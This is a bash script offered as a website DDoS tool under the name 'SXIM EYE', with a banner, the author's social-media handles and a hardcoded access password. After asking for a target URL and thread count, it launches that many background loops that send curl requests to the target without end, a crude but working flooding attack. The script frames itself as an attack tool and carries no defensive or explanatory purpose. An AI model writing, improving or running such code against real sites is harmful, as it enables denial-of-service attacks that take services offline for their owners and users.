apt update && apt upgrade -y
clear


echo "
    ███████╗██╗  ██╗██╗███╗   ███╗    ███████╗██╗   ██╗███████╗
    ██╔════╝╚██╗██╔╝██║████╗ ████║    ██╔════╝╚██╗ ██╔╝██╔════╝
    ███████╗ ╚███╔╝ ██║██╔████╔██║    █████╗   ╚████╔╝ █████╗
    ╚════██║ ██╔██╗ ██║██║╚██╔╝██║    ██╔══╝    ╚██╔╝  ██╔══╝
    ███████║██╔╝ ██╗██║██║ ╚═╝ ██║    ███████╗   ██║   ███████╗
    ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝    ╚══════╝   ╚═╝   ╚══════╝


" |lolcat
#!/bin/bash

# Define colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color


echo  -e "${RED}                                                  [ BY SXIM ]${NC}"


echo -e "${BLUR}       [ INSTA]   : @CODING.SMIT
           ${NC} "

echo -e "${BLUE}       [GITHUB]   : https://github.com/coding-smit
      ${NC}"

echo -e "${YELLOW}       [PASSWORD] : CONTACT ME  INSTAGRAM

   ${NC}"

echo -e "${RED}            [ THIS TOOL IS A D-DOS ATTACK TO WEBSITE]


    ${NC}"






PS1='\[\e[31] [\[\e[37m\]\T\ [\e[31m\]]-\e[1;93m [SXIM EYE]\e[0;31m-[\#]\n| \n\e[0;31m [\[\e[31m\]\e[0;35m\W\[\e[31m\]]-► \e[1;92m'

# Function to send requests in an infinite loop
ddos_attack() {
    url=$1
    while true; do
        curl -s "$url" > /dev/null
        echo "Sent request to $url"
    done
}

# Main script
read -p "---> [ Enter the target URL]: " target_url
read -p "---> [ Enter the number of threads]: " num_threads
read  -sp "---> [ Enter the password]: " password

echo

# Check password
correct_password="sxim@9328"  # Replace 'yourpassword' with the actual password
if [ "$password" != "$correct_password" ]; then
    echo -e  "${RED}
Incorrect password. Exiting.CONTACT TO INSTAGRAM FOR PASSWORD

${RED}"
    exit 1
fi





# Confirmation prompt

read -p " start the DDoS attack on $target_url with $num_threads threads? (y/n): " confirm
if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    echo "DDoS attack cancelled."
    exit 0
fi

for i in $(seq 1 $num_threads); do
    ddos_attack "$target_url" &
done

echo "DDoS attack started on $target_url with $num_threads threads."
echo "Press Ctrl+C to stop the attack."



# Wait for all background processes to complete (which never happens in this case)
wait
